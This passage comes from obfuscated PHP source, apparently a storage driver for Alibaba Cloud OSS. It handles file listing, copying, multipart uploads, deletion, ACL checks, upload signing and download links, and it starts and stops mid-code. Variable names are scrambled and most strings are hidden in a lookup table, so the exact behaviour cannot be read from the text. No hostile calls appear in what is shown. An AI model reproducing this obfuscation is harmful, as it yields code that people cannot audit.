$Ø®Üšå™[188]) { return !1; } $¦ïòÊƒû = array_map($Ø®Üšå™[190], $¼÷ë™…÷[$Ø®Üšå™[191]]); if (!is_array($¦ïòÊƒû)) { $¦ïòÊƒû = array(); } $ÒûÄ‰¼ = array($Ø®Üšå™[192], $Ø®Üšå™[193], $Ø®Üšå™[194], $Ø®Üšå™[195], $Ø®Üšå™[196]); $±ÈÜ”ñ½ = array_diff($ÒûÄ‰¼, $¦ïòÊƒû); return empty($±ÈÜ”ñ½); } public function mkfile($–î¤¯ã, $‘Æ¼Ø´Ñ = '', $õÍ¯åš€ = REPEAT_RENAME) { $‡ø‰ıÑÒ = $this->setContent($–î¤¯ã, $‘Æ¼Ø´Ñ); if ($‡ø‰ıÑÒ !== !1) { return $this->getPathOuter($–î¤¯ã); } return !1; } public function mkdir($ç °Ú„Æ, $Â§ä¯… = REPEAT_SKIP) { if ($Â§ä¯… && $this->_isFolder($ç °Ú„Æ)) { return $this->getPathOuter($ç °Ú„Æ); } try { $this->client->createObjectDir($this->bucket, $this->pathEncode($ç °Ú„Æ)); } catch (OSS\Core\OssException $µşº‰µ») { return !1; } return $this->getPathOuter($ç °Ú„Æ); } private function fileList($¿¿ÖåÖ, $¥È¶í°Ø = '', $ ½Õ¹æ­ = 0) { $·Ó¿¤ëü =& $_SERVER[ÏéâËõ‘]; $¿¿ÖåÖ = trim($¿¿ÖåÖ, $·Ó¿¤ëü[8]); $´Ÿıãà = empty($¿¿ÖåÖ) && $¿¿ÖåÖ !== $·Ó¿¤ëü[197] ? $·Ó¿¤ëü[12] : $¿¿ÖåÖ . $·Ó¿¤ëü[8]; $µµ•ï¼ = $·Ó¿¤ëü[12]; $×Á¯¢ÙÂ = 1000; $¤èÌÃüÁ = $Áğ¯¹Ïø = array(); while (!0) { check_abort(); $ï«Œ«É© = array($·Ó¿¤ëü[1399] => $¥È¶í°Ø, $·Ó¿¤ëü[1400] => $´Ÿıãà, $·Ó¿¤ëü[1401] => $×Á¯¢ÙÂ, $·Ó¿¤ëü[1402] => $µµ•ï¼); try { $ÔĞÂÒ‰ò = $this->client->listObjects($this->bucket, $ï«Œ«É©); } catch (OSS\Core\OssException $ŞÌû¥±—) { break; } $µµ•ï¼ = $ÔĞÂÒ‰ò->getNextMarker(); $¸ë²áÍî = $ÔĞÂÒ‰ò->getObjectList(); $èÏ²ƒÛ = $ÔĞÂÒ‰ò->getPrefixList(); foreach ($¸ë²áÍî as $ïŸ´ˆˆå) { if ($ïŸ´ˆˆå->getKey() == $´Ÿıãà) { continue; } $²‡Òéõ = $ïŸ´ˆˆå->getKey(); $ïàò½Òé = $ïŸ´ˆˆå->getSize(); $µ‡Ûèú‡ = $ïŸ´ˆˆå->getLastModified(); $ŞïÀÀ§… = $ ½Õ¹æ­ ? array($·Ó¿¤ëü[32] => $²‡Òéõ, $·Ó¿¤ëü[76] => $ïàò½Òé, $·Ó¿¤ëü[203] => strtotime($µ‡Ûèú‡)) : $²‡Òéõ; $•êĞ’ü = $ïàò½Òé == 0 && substr($²‡Òéõ, strlen($²‡Òéõ) - 1, 1) == $·Ó¿¤ëü[8] ? !0 : !1; $Å‚¿’ = array($·Ó¿¤ëü[76] => $ïàò½Òé, $·Ó¿¤ëü[1403] => $ïàò½Òé, $·Ó¿¤ëü[85] => strtotime($µ‡Ûèú‡), $·Ó¿¤ëü[1404] => $µ‡Ûèú‡); $this->cacheMethodInfoSet($²‡Òéõ, $•êĞ’ü, $Å‚¿’); if ($•êĞ’ü) { $¤èÌÃüÁ[] = $²‡Òéõ; continue; } $Áğ¯¹Ïø[] = $ŞïÀÀ§…; } foreach ($èÏ²ƒÛ as $¢‚€‘à¤) { $¤èÌÃüÁ[] = $¢‚€‘à¤->getPrefix(); $this->cacheMethodInfoSet($¢‚€‘à¤->getPrefix(), !0); } if ($µµ•ï¼ === $·Ó¿¤ëü[12]) { break; } } $this->cacheMethodInfoSet($¿¿ÖåÖ, !0); return array($·Ó¿¤ëü[82] => $¤èÌÃüÁ, $·Ó¿¤ëü[83] => $Áğ¯¹Ïø); } public function copyFile($î£ò¥‘, $ûõó˜ë¹) { $î“ş»ƒµ = $this->size($î£ò¥‘); if ($î“ş»ƒµ < 1024 * 1024 * 1024) { try { $this->client->copyObject($this->bucket, $î£ò¥‘, $this->bucket, $this->pathEncode($ûõó˜ë¹)); } catch (OSS\Core\OssException $ğùÉ©ùÛ) { return !1; } return $this->getPathOuter($ûõó˜ë¹); } $¹Á¶ÒÖ = $this->multiCopyObject($î£ò¥‘, $ûõó˜ë¹, $î“ş»ƒµ); return $¹Á¶ÒÖ ? $this->getPathOuter($ûõó˜ë¹) : !1; } private function multiCopyObject($¶ÚÍ, $‘ÌŸÖ´¾, $ëš˜İ‰ß) { $°İ„Ù¦¬ =& $_SERVER[ÏéâËõ‘]; try { $ÕØÏåØÎ = array(); if ($İ˜ş•şµ = $this->hashMd5($¶ÚÍ)) { $ÕØÏåØÎ = array(OSS\OssClient::OSS_HEADERS => array($°İ„Ù¦¬[1405] => $İ˜ş•şµ)); } $ØÜÙêŠî = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($‘ÌŸÖ´¾), $ÕØÏåØÎ); $û×Öİ›² = 1; $‹ÓŒÌ‚˜ = 0; $º±ä‚³½ = array(); $¥û•ö×æ = 1024 * 1024 * 10; $–èŒƒ„ï = $this->client->generateMultiuploadParts($ëš˜İ‰ß, $¥û•ö×æ); foreach ($–èŒƒ„ï as $Í›ú¸¯â => $íÍèšß÷) { $±îô¡áÉ = $‹ÓŒÌ‚˜ + (int) $íÍèšß÷[$°İ„Ù¦¬[1406]]; $ùüŞªÁ½ = (int) $íÍèšß÷[$°İ„Ù¦¬[337]] + $±îô¡áÉ - 1; $ƒ”Ä§Ï = array($°İ„Ù¦¬[1407] => $±îô¡áÉ, $°İ„Ù¦¬[1408] => $ùüŞªÁ½); $º±ä‚³½[] = $this->client->uploadPartCopy($this->bucket, $¶ÚÍ, $this->bucket, $this->pathEncode($‘ÌŸÖ´¾), $û×Öİ›², $ØÜÙêŠî, $ƒ”Ä§Ï); $û×Öİ›² = $û×Öİ›² + 1; } $ñ¬á÷Ë¸ = array(); foreach ($º±ä‚³½ as $Í›ú¸¯â => $ñÏ•Ğ¡) { $ñ¬á÷Ë¸[] = array($°İ„Ù¦¬[1409] => $Í›ú¸¯â + 1, $°İ„Ù¦¬[1410] => $ñÏ•Ğ¡); } $this->client->completeMultipartUpload($this->bucket, $this->pathEncode($‘ÌŸÖ´¾), $ØÜÙêŠî, $ñ¬á÷Ë¸); } catch (OSS\Core\OssException $áşäÒÏ÷) { return !1; } return !0; } public function moveFile($¦§Œ¡†”, $€§‡ª¿†) { if ($this->copyFile($¦§Œ¡†”, $€§‡ª¿†)) { $this->remove($¦§Œ¡†”); return $this->getPathOuter($€§‡ª¿†); } return !1; } public function delFile($±À“é“È) { try { $this->client->deleteObject($this->bucket, $this->pathEncode($±À“é“È)); } catch (OSS\Core\OssException $§€„îÜ) { return !1; } return !0; } public function delFolder($Õ¿Šä×İ) { $İâˆ×Ò° =& $_SERVER[ÏéâËõ‘]; if (!$this->exist($Õ¿Šä×İ)) { return !0; } $this->listItemCache = !1; $™ª¨ùŒÍ = $this->fileList($Õ¿Šä×İ); $this->listItemCache = !0; $ËÔø†ú˜ = trim($Õ¿Šä×İ, $İâˆ×Ò°[8]) . $İâˆ×Ò°[8]; if (!empty($Õ¿Šä×İ) && $Õ¿Šä×İ !== $İâˆ×Ò°[197] && !in_array($ËÔø†ú˜, $™ª¨ùŒÍ[$İâˆ×Ò°[82]])) { $™ª¨ùŒÍ[$İâˆ×Ò°[82]][] = $ËÔø†ú˜; } $“ãŞ²‚ = $this->delByBatch($™ª¨ùŒÍ[$İâˆ×Ò°[83]]); if (!$“ãŞ²‚) { return !1; } $“ãŞ²‚ = $this->delByBatch($™ª¨ùŒÍ[$İâˆ×Ò°[82]]); if (!$“ãŞ²‚) { return !1; } return $this->delFile($ËÔø†ú˜); } private function delByBatch($’½ö†å®) { foreach (array_chunk($’½ö†å®, 1000) as $úİ÷ÇÊ) { try { $this->client->deleteObjects($this->bucket, $úİ÷ÇÊ); } catch (OSS\Core\OssException $»·Ì­Ã¯) { return !1; } } return !0; } public function rename($ÄÏı¾ä°, $¡˜›¥Âú) { return $this->renameObject($ÄÏı¾ä°, $¡˜›¥Âú); } private function fileInfo($ıÄ‡ñş, $ø–îéÂ– = false, $ÔĞş¦¸” = array()) { $ª‰±¡ìæ =& $_SERVER[ÏéâËõ‘]; $¶ş’É–­ = array($ª‰±¡ìæ[32] => $this->pathThis($ıÄ‡ñş), $ª‰±¡ìæ[84] => $this->getPathOuter($ıÄ‡ñş), $ª‰±¡ìæ[33] => $ª‰±¡ìæ[199], $ª‰±¡ìæ[76] => isset($ÔĞş¦¸”[$ª‰±¡ìæ[76]]) ? $ÔĞş¦¸”[$ª‰±¡ìæ[76]] : 0, $ª‰±¡ìæ[174] => $this->ext($ıÄ‡ñş)); if ($ø–îéÂ–) { return $¶ş’É–­; } $¶ş’É–­[$ª‰±¡ìæ[200]] = $¶ş’É–­[$ª‰±¡ìæ[85]] = 0; $¶ş’É–­[$ª‰±¡ìæ[201]] = $¶ş’É–­[$ª‰±¡ìæ[202]] = !0; if (empty($ÔĞş¦¸”)) { $ ÄŒ€ = $this->objectMeta($ıÄ‡ñş); if (!$ ÄŒ€) { return $¶ş’É–­; } $ÔĞş¦¸” = array($ª‰±¡ìæ[85] => strtotime($ ÄŒ€[$ª‰±¡ìæ[1404]]), $ª‰±¡ìæ[76] => $ ÄŒ€[$ª‰±¡ìæ[1403]] + 0); } if (isset($ÔĞş¦¸”[$ª‰±¡ìæ[76]])) { $¶ş’É–­[$ª‰±¡ìæ[76]] = $ÔĞş¦¸”[$ª‰±¡ìæ[76]]; } if (isset($ÔĞş¦¸”[$ª‰±¡ìæ[85]])) { $¶ş’É–­[$ª‰±¡ìæ[85]] = $ÔĞş¦¸”[$ª‰±¡ìæ[85]]; } if (isset($ÔĞş¦¸”[$ª‰±¡ìæ[203]]) && !trim($¶ş’É–­[$ª‰±¡ìæ[85]])) { $¶ş’É–­[$ª‰±¡ìæ[85]] = $ÔĞş¦¸”[$ª‰±¡ìæ[203]]; } return $¶ş’É–­; } private function folderInfo($‰€Æ°ææ, $ç´—äñ‰ = false, $ëÇØã¥ = array()) { $³µ¡¸øÒ =& $_SERVER[ÏéâËõ‘]; $‚”°Üš³ = array($³µ¡¸øÒ[32] => $this->pathThis($‰€Æ°ææ), $³µ¡¸øÒ[84] => $this->getPathOuter($³µ¡¸øÒ[8] . $‰€Æ°ææ), $³µ¡¸øÒ[33] => $³µ¡¸øÒ[75]); if ($ç´—äñ‰) { return $‚”°Üš³; } $‚”°Üš³[$³µ¡¸øÒ[200]] = $‚”°Üš³[$³µ¡¸øÒ[85]] = 0; $‚”°Üš³[$³µ¡¸øÒ[201]] = $‚”°Üš³[$³µ¡¸øÒ[202]] = !0; if (empty($ëÇØã¥)) { $‰€Æ°ææ = rtrim($‰€Æ°ææ, $³µ¡¸øÒ[8]) . $³µ¡¸øÒ[8]; $ÇæùûİÄ = $this->objectMeta($‰€Æ°ææ); if (!$ÇæùûİÄ) { return $‚”°Üš³; } $ëÇØã¥ = array($³µ¡¸øÒ[200] => $ÇæùûİÄ[$³µ¡¸øÒ[511]][$³µ¡¸øÒ[1411]], $³µ¡¸øÒ[85] => strtotime($ÇæùûİÄ[$³µ¡¸øÒ[1404]])); } if (isset($ëÇØã¥[$³µ¡¸øÒ[85]])) { $‚”°Üš³[$³µ¡¸øÒ[85]] = $ëÇØã¥[$³µ¡¸øÒ[85]]; } if (isset($ëÇØã¥[$³µ¡¸øÒ[200]])) { $‚”°Üš³[$³µ¡¸øÒ[200]] = $ëÇØã¥[$³µ¡¸øÒ[200]]; } return $‚”°Üš³; } public function listPath($•ëĞÓÌ×, $ºˆˆíÆÏ = false) { $­Ê–èßá =& $_SERVER[ÏéâËõ‘]; $í©©Û = $this->fileList($•ëĞÓÌ×, $­Ê–èßá[8], !0); foreach ($í©©Û[$­Ê–èßá[82]] as $›‡¯½¬” => $ÌàòåçÙ) { $í©©Û[$­Ê–èßá[82]][$›‡¯½¬”] = $this->folderInfo($ÌàòåçÙ, $ºˆˆíÆÏ, $ÌàòåçÙ); } foreach ($í©©Û[$­Ê–èßá[83]] as $›‡¯½¬” => $ÌàòåçÙ) { $í©©Û[$­Ê–èßá[83]][$›‡¯½¬”] = $this->fileInfo($ÌàòåçÙ[$­Ê–èßá[32]], $ºˆˆíÆÏ, $ÌàòåçÙ); } return $í©©Û; } protected function infoChildren($ÔŒèÙ—¬, &$ÍÃÏÜ¤¬) { $İ¿åÙ˜ˆ =& $_SERVER[ÏéâËõ‘]; $ù®Ç¯Œ‘ = $this->fileList($ÔŒèÙ—¬, $İ¿åÙ˜ˆ[12], !0); $ÍÃÏÜ¤¬[$İ¿åÙ˜ˆ[78]] += count($ù®Ç¯Œ‘[$İ¿åÙ˜ˆ[82]]); $ÍÃÏÜ¤¬[$İ¿åÙ˜ˆ[77]] += count($ù®Ç¯Œ‘[$İ¿åÙ˜ˆ[83]]); foreach ($ù®Ç¯Œ‘[$İ¿åÙ˜ˆ[83]] as $¡ó¨¤µ) { if (!$¡ó¨¤µ || !$¡ó¨¤µ[$İ¿åÙ˜ˆ[76]]) { continue; } $ÍÃÏÜ¤¬[$İ¿åÙ˜ˆ[76]] += $¡ó¨¤µ[$İ¿åÙ˜ˆ[76]]; } } public function has($úıëÂÄÛ, $¦˜ˆÑã = false, $˜’õŒúÅ = true) { $ÃœÚ­ò® =& $_SERVER[ÏéâËõ‘]; $úıëÂÄÛ = trim($úıëÂÄÛ, $ÃœÚ­ò®[8]); $è…Æ‹É€ = empty($úıëÂÄÛ) && $úıëÂÄÛ !== $ÃœÚ­ò®[197] ? $ÃœÚ­ò®[12] : $úıëÂÄÛ . $ÃœÚ­ò®[8]; $Ã¼ÔÎ›¡ = $ÃœÚ­ò®[12]; $ı†Ùœ» = 500; $€“”™×å = $Ô©•³‰ì = 0; while (!0) { check_abort(); $±ü‹À¦È = array($ÃœÚ­ò®[1399] => $ÃœÚ­ò®[8], $ÃœÚ­ò®[1400] => $è…Æ‹É€, $ÃœÚ­ò®[1401] => $ı†Ùœ», $ÃœÚ­ò®[1402] => $Ã¼ÔÎ›¡); try { $š˜ªµÍı = $this->client->listObjects($this->bucket, $±ü‹À¦È); } catch (OSS\Core\OssException $òêâŒ¥ã) { break; } $Ã¼ÔÎ›¡ = $š˜ªµÍı->getNextMarker(); $ØĞ’ŞÇ = $š˜ªµÍı->getObjectList(); $Ÿ¬íÛ—œ = $š˜ªµÍı->getPrefixList(); if ($¦˜ˆÑã) { if (count($ØĞ’ŞÇ) > 1 || count($ØĞ’ŞÇ) == 1 && $ØĞ’ŞÇ[0]->getKey() != $è…Æ‹É€) { $€“”™×å += count($ØĞ’ŞÇ) - 1; } if (!empty($Ÿ¬íÛ—œ)) { $Ô©•³‰ì += count($Ÿ¬íÛ—œ); } if ($Ã¼ÔÎ›¡ === $ÃœÚ­ò®[12]) { break; } continue; } if ($˜’õŒúÅ) { if (!empty($ØĞ’ŞÇ)) { if (count($ØĞ’ŞÇ) > 1 || $ØĞ’ŞÇ[0]->getKey() != $è…Æ‹É€) { return !0; } } } else { if (!empty($Ÿ¬íÛ—œ)) { return !0; } } if ($Ã¼ÔÎ›¡ === $ÃœÚ­ò®[12]) { break; } } if ($¦˜ˆÑã) { return array($ÃœÚ­ò®[207] => $€“”™×å, $ÃœÚ­ò®[208] => $Ô©•³‰ì); } return !1; } public function listAll($í©³Î·¨) { $Ÿƒ®ÀÓ™ =& $_SERVER[ÏéâËõ‘]; $ã¶ÇÀ­  = $this->fileList($í©³Î·¨, $Ÿƒ®ÀÓ™[12], !0); $’¯‡™Œ = array(); foreach ($ã¶ÇÀ­ [$Ÿƒ®ÀÓ™[83]] as $Ğ®´©ŠÕ) { $’¯‡™Œ[$Ğ®´©ŠÕ[$Ÿƒ®ÀÓ™[32]]] = $Ğ®´©ŠÕ[$Ÿƒ®ÀÓ™[76]]; } foreach ($ã¶ÇÀ­ [$Ÿƒ®ÀÓ™[82]] as $Ğ®´©ŠÕ) { if (is_string($Ğ®´©ŠÕ)) { $’¯‡™Œ[$Ğ®´©ŠÕ] = 0; } } return $this->listAllFiles($í©³Î·¨, array_keys($’¯‡™Œ), $’¯‡™Œ); } public function canRead($Ûí’ãªŠ) { $¿ûæû™Ÿ =& $_SERVER[ÏéâËõ‘]; $®¼õû«Ï = $this->pathAcl($Ûí’ãªŠ); return $®¼õû«Ï == $¿ûæû™Ÿ[1412] || $®¼õû«Ï == $¿ûæû™Ÿ[556] ? !0 : !1; } public function canWrite($ó£¨¢î) { $Û©ú°âñ = $this->pathAcl($ó£¨¢î); return $Û©ú°âñ == $_SERVER[ÏéâËõ‘][556] ? !0 : !1; } public function pathAcl($©âõ—É ) { $¥è½È¯Ş =& $_SERVER[ÏéâËõ‘]; if (empty($this->bucketAcl)) { $this->bucketAcl = $this->client->getBucketAcl($this->bucket); } try { $´ÓçÑ‡ğ = $this->client->getObjectAcl($this->bucket, $this->pathEncode($©âõ—É )); } catch (OSS\Core\OssException $ÀÇî™è‹) { return !1; } $Í®”ÙÑ = $´ÓçÑ‡ğ == $¥è½È¯Ş[37] ? $this->bucketAcl : $´ÓçÑ‡ğ; if ($Í®”ÙÑ == $¥è½È¯Ş[1413]) { return $¥è½È¯Ş[1412]; } if ($Í®”ÙÑ == $¥è½È¯Ş[1414]) { return $¥è½È¯Ş[556]; } return $Í®”ÙÑ; } private function chmodPath($ı¾ºÕ†”, $ªÜÂóá² = '') { $éşÌµÒ =& $_SERVER[ÏéâËõ‘]; $¬Òˆ¿­ó = empty($ªÜÂóá²) ? $éşÌµÒ[1414] : $ªÜÂóá²; $êúø…Ñû = array($éşÌµÒ[37], $éşÌµÒ[198], $éşÌµÒ[1413], $éşÌµÒ[1414]); if (!in_array($¬Òˆ¿­ó, $êúø…Ñû)) { return !1; } try { $this->client->putObjectAcl($this->bucket, $this->pathEncode($ı¾ºÕ†”), $¬Òˆ¿­ó); } catch (OSS\Core\OssException $¢¨ÒÌøŞ) { return !1; } return !0; } public function getContent($âßÇà¤ê) { return $this->fileSubstr($âßÇà¤ê, -1); } public function setContent($ãËÄ®Š, $ëò©Ë¿æ = '') { $Ê®ıÏºĞ =& $_SERVER[ÏéâËõ‘]; try { $Ñß®ŸâÙ = $this->trafficLimit($Ê®ıÏºĞ[1415]); $‡£‰Á = $this->client->putObject($this->bucket, $this->pathEncode($ãËÄ®Š), $ëò©Ë¿æ, $Ñß®ŸâÙ); } catch (OSS\Core\OssException $éäõùãø) { return !1; } $ÑËñ– = array($Ê®ıÏºĞ[1405] => trim($‡£‰Á[$Ê®ıÏºĞ[1416]], $Ê®ıÏºĞ[118]), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($ãËÄ®Š))); $this->updateObjMeta($ãËÄ®Š, $ÑËñ–); return isset($‡£‰Á[$Ê®ıÏºĞ[1417]][$Ê®ıÏºĞ[1364]]) ? !0 : !1; } private function updateObjMeta($›ç–Ã½, $·åàûŠ) { $›ç–Ã½ = $this->pathEncode($›ç–Ã½); try { $²Œßûñ = array(OSS\OssClient::OSS_HEADERS => $·åàûŠ); $this->client->copyObject($this->bucket, $›ç–Ã½, $this->bucket, $›ç–Ã½, $²Œßûñ); } catch (OSS\Core\OssException $“şø±¥) { return !1; } return !0; } public function upload($üÅÕ¥˜Ï, $Ú÷ûñÓ¼, $Ã¦•š± = false, $É­•ßàî = REPEAT_REPLACE) { $„Æè‘Ù§ =& $_SERVER[ÏéâËõ‘]; $ÜœÛ«´º = trim($üÅÕ¥˜Ï, $„Æè‘Ù§[8]); $şàî„şÓ = array(OSS\OssClient::OSS_CHECK_MD5 => !0, OSS\OssClient::OSS_PART_SIZE => 1024 * 1024 * 10, OSS\OssClient::OSS_HEADERS => array($„Æè‘Ù§[1405] => @md5_file($Ú÷ûñÓ¼)), OSS\OssClient::OSS_CONTENT_TYPE => get_file_mime(get_path_ext($üÅÕ¥˜Ï))); $şàî„şÓ = $this->trafficLimit($„Æè‘Ù§[1415], $şàî„şÓ); try { $this->client->multiuploadFile($this->bucket, $this->pathEncode($ÜœÛ«´º), $Ú÷ûñÓ¼, $şàî„şÓ); } catch (OSS\Core\OssException $÷Ûâ¼ò†) { return !1; } return $this->getPathOuter($üÅÕ¥˜Ï); } public function getHost() { $²ŸËÜÜ» =& $_SERVER[ÏéâËõ‘]; $÷“ñ³Õ° = explode($²ŸËÜÜ»[183], parent::getHost()); return $÷“ñ³Õ°[0] . $²ŸËÜÜ»[183] . $this->bucket . $²ŸËÜÜ»[10] . $÷“ñ³Õ°[1]; } public function uploadFormData($Øª­—¶Ä, $øíœ¸è­ = 3600) { $ßüÏçšö =& $_SERVER[ÏéâËõ‘]; if (!($è³±²½± = $this->getHost())) { return !1; } $¥˜«·¯¸ = $øíœ¸è­; $ é¾Ç• = date($ßüÏçšö[1418], time() + $¥˜«·¯¸); $ÙİÜ¬ = new DateTime($ é¾Ç•); $• Ë‹¦Ğ = $ÙİÜ¬->format(DateTime::ISO8601); $ œ‰†³Ñ = strpos($• Ë‹¦Ğ, $ßüÏçšö[296]); $• Ë‹¦Ğ = substr($• Ë‹¦Ğ, 0, $ œ‰†³Ñ) . $ßüÏçšö[1419]; $¯©„÷ŒÉ = 1048576000 * 5; $‡şË®„® = $this->pathFather($Øª­—¶Ä); $Â›şÖí = array($ßüÏçšö[1317] => $• Ë‹¦Ğ, $ßüÏçšö[1318] => array(array($ßüÏçšö[1420], 0, $¯©„÷ŒÉ), array($ßüÏçšö[1321], $ßüÏçšö[1322], $‡şË®„®))); $¬ØƒõÊÙ = base64_encode(json_encode($Â›şÖí)); $àÙâõ˜Ø = base64_encode(hash_hmac($ßüÏçšö[232], $¬ØƒõÊÙ, $this->secret, !0)); $±¿Æ¥÷ş = array($ßüÏçšö[1327] => $¬ØƒõÊÙ, $ßüÏçšö[1421] => $this->accessKey, $ßüÏçšö[1323] => $ßüÏçšö[1315], $ßüÏçšö[1422] => $àÙâõ˜Ø, $ßüÏçšö[181] => $è³±²½±); $±¿Æ¥÷ş = $this->trafficLimit($ßüÏçšö[1415], $±¿Æ¥÷ş); return $±¿Æ¥÷ş; } public function multiUploadFormData($ŸîÊµı½, $İÃ§¥Ú = 3600) { $éË£·ÁÁ =& $_SERVER[ÏéâËõ‘]; if (!($‡ÓËÎÛ = $this->getHost())) { return !1; } $‹Ïµ¦Ç– = $this->trafficLimit($éË£·ÁÁ[1415]); $¸²äê³ = $this->client->initiateMultipartUpload($this->bucket, $this->pathEncode($ŸîÊµı½), $‹Ïµ¦Ç–); return array($éË£·ÁÁ[223] => $¸²äê³, $éË£·ÁÁ[181] => $‡ÓËÎÛ . $éË£·ÁÁ[8] . $this->pathEncode($ŸîÊµı½), $éË£·ÁÁ[224] => gmdate($éË£·ÁÁ[1423]), $éË£·ÁÁ[94] => $ŸîÊµı½); } public function multiUploadAuthData($œ•ìü×Ó, $ÌâğèÏ‡ = array()) { $Î’ï×ƒ´ =& $_SERVER[ÏéâËõ‘]; $¥ıáäóª = isset($ÌâğèÏ‡[$Î’ï×ƒ´[224]]) ? $ÌâğèÏ‡[$Î’ï×ƒ´[224]] : gmdate($Î’ï×ƒ´[1423]); $Âİ“†¦Ş = isset($ÌâğèÏ‡[$Î’ï×ƒ´[174]]) ? $ÌâğèÏ‡[$Î’ï×ƒ´[174]] : $Î’ï×ƒ´[12]; $¯¡·µ¶Ú = $œ•ìü×Ó; if (isset($ÌâğèÏ‡[$Î’ï×ƒ´[94]])) { $¯¡·µ¶Ú = $ÌâğèÏ‡[$Î’ï×ƒ´[94]]; unset($ÌâğèÏ‡[$Î’ï×ƒ´[94]]); } if (isset($ÌâğèÏ‡[$Î’ï×ƒ´[225]])) { $ÌâğèÏ‡[$Î’ï×ƒ´[224]] = $¥ıáäóª; return $this->listUploadParts($¯¡·µ¶Ú, $ÌâğèÏ‡); } $¾ ¥Í› = array($Î’ï×ƒ´[226], $Î’ï×ƒ´[12], $Î’ï×ƒ´[120], $¥ıáäóª, "\170\x2d\157\163\x73\55\x64\x61\164\145\x3a{$¥ıáäóª}", $Î’ï×ƒ´[8] . $this->bucket . $Î’ï×ƒ´[8] . $¯¡·µ¶Ú . $Âİ“†¦Ş); if (strpos($Âİ“†¦Ş, $Î’ï×ƒ´[227]) === 0) { $¾ ¥Í›[0] = $Î’ï×ƒ´[228]; if ($—íœ­ï´ = $this->trafficLimit($Î’ï×ƒ´[1415])) { $¯¡·µ¶Ú = $Î’ï×ƒ´[1424]; array_splice($¾ ¥Í›, 5, 0, $¯¡·µ¶Ú . $Î’ï×ƒ´[4] . $—íœ­ï´[$¯¡·µ¶Ú]); } } if (isset($ÌâğèÏ‡[$Î’ï×ƒ´[229]]) && $ÌâğèÏ‡[$Î’ï×ƒ´[229]] == $Î’ï×ƒ´[230]) { $¾ ¥Í›[0] = $Î’ï×ƒ´[230]; } if (!empty($ÌâğèÏ‡[$Î’ï×ƒ´[1425]])) { $¥œ½ô—ñ = array_merge(array($¾ ¥Í›[4]), $ÌâğèÏ‡[$Î’ï×ƒ´[1425]]); sort($¥œ½ô—ñ); $¾ ¥Í›[4] = implode($Î’ï×ƒ´[231], $¥œ½ô—ñ); } $ê“‡Äï° = implode($Î’ï×ƒ´[231], $¾ ¥Í›); $Ô ığâÑ = base64_encode(hash_hmac($Î’ï×ƒ´[232], $ê“‡Äï°, $this->secret, !0)); $ÜÛò˜òÇ = $Î’ï×ƒ´[1389] . $this->accessKey . $Î’ï×ƒ´[4] . $Ô ığâÑ; if (strpos($Âİ“†¦Ş, $Î’ï×ƒ´[227]) === 0) { $ÜÛò˜òÇ = array($Î’ï×ƒ´[234] => $ÜÛò˜òÇ, $Î’ï×ƒ´[224] => $¥ıáäóª); if ($—íœ­ï´) { $ÜÛò˜òÇ = array_merge($ÜÛò˜òÇ, $—íœ­ï´); } } return $ÜÛò˜òÇ; } public function listUploadParts($ç’Úââ, $ËÜşÌŸ´) { $®Ãİé–µ =& $_SERVER[ÏéâËõ‘]; $ÖéÙüşÖ = parse_url_query($ËÜşÌŸ´[$®Ãİé–µ[174]]); $òó“’òÄ = $this->client->listParts($this->bucket, $this->pathEncode($ç’Úââ), $ÖéÙüşÖ[$®Ãİé–µ[223]]); $ÛßˆÎÒ¨ = $òó“’òÄ->getListPart(); $„Ôæıæ = array(); foreach ($ÛßˆÎÒ¨ as $îèÊÙÊ²) { $„Ôæıæ[] = array($®Ãİé–µ[1409] => $îèÊÙÊ²->getPartNumber(), $®Ãİé–µ[1410] => trim($îèÊÙÊ²->getETag(), $®Ãİé–µ[118])); } unset($ËÜşÌŸ´[$®Ãİé–µ[225]], $ËÜşÌŸ´[$®Ãİé–µ[229]]); $ì¦¨à°— = $this->multiUploadAuthData($ç’Úââ, $ËÜşÌŸ´); if (empty($ì¦¨à°—)) { return !1; } return array($®Ãİé–µ[234] => $ì¦¨à°—, $®Ãİé–µ[224] => $ËÜşÌŸ´[$®Ãİé–µ[224]], $®Ãİé–µ[236] => $„Ôæıæ); } public function download($ÒŒ÷ªı, $†©Š­Ş) { if ($this->isFolder($ÒŒ÷ªı)) { return !1; } try { $Öé‚‡Ç“ = array(OSS\OssClient::OSS_FILE_DOWNLOAD => $†©Š­Ş); $Öé‚‡Ç“ = $this->trafficLimit($_SERVER[ÏéâËõ‘][109], $Öé‚‡Ç“); $this->client->getObject($this->bucket, $this->pathEncode($ÒŒ÷ªı), $Öé‚‡Ç“); } catch (OSS\Core\OssException $¬³“ÚÂ) { return !1; } return $†©Š­Ş; } public function fileSubstr($ÈÈ‘•, $×½Ç„çõ = 0, $õÆßÄü¯ = false) { if ($×½Ç„çõ === -1) { $§™¿¸·ê = array(); } else { if ($õÆßÄü¯ === !1) { $ğæÌûò = $this->size($ÈÈ‘•); } else { $ğæÌûò = $×½Ç„çõ + $õÆßÄü¯ - 1; } $§™¿¸·ê = array(OSS\OssClient::OSS_RANGE => "{$×½Ç„çõ}\55{$ğæÌûò}"); } try { return $this->client->getObject($this->bucket, $this->pathEncode($ÈÈ‘•), $§™¿¸·ê); } catch (OSS\Core\OssException $ÉÇñ) { think_exception($ÉÇñ->getMessage()); return !1; } } private function trafficLimit($í•…«ğù, $“Ç­©˜´ = array()) { $ú‰óÌÛï =& $_SERVER[ÏéâËõ‘]; if ($í•…«ğù == $ú‰óÌÛï[1415] && $this->isUploadServer() || $í•…«ğù == $ú‰óÌÛï[109] && $this->isFileOutServer()) { return $“Ç­©˜´; } $ŠÎ¤äÒÔ = floatval($GLOBALS[$ú‰óÌÛï[6]][$ú‰óÌÛï[89]][$ú‰óÌÛï[107]][$í•…«ğù]) * 1024 * 1024 * 8; if (!$ŠÎ¤äÒÔ) { return $“Ç­©˜´; } $ŠÎ¤äÒÔ = $ŠÎ¤äÒÔ < 819200 ? 819200 : ($ŠÎ¤äÒÔ > 838860800 ? 838860800 : $ŠÎ¤äÒÔ); $“Ç­©˜´[OSS\OssClient::OSS_TRAFFIC_LIMIT] = intval($ŠÎ¤äÒÔ); return $“Ç­©˜´; } public function link($ÒÇÌ§ü, $ƒúæƒæ = array()) { $·‚‰¾¨ã =& $_SERVER[ÏéâËõ‘]; if (!$this->exist($ÒÇÌ§ü) || $this->isFolder($ÒÇÌ§ü)) { return !1; } try { $ƒúæƒæ = $this->trafficLimit($·‚‰¾¨ã[109], $ƒúæƒæ); $¢Œ“§ß = $this->client->signUrl($this->bucket, $this->pathEncode($ÒÇÌ§ü), 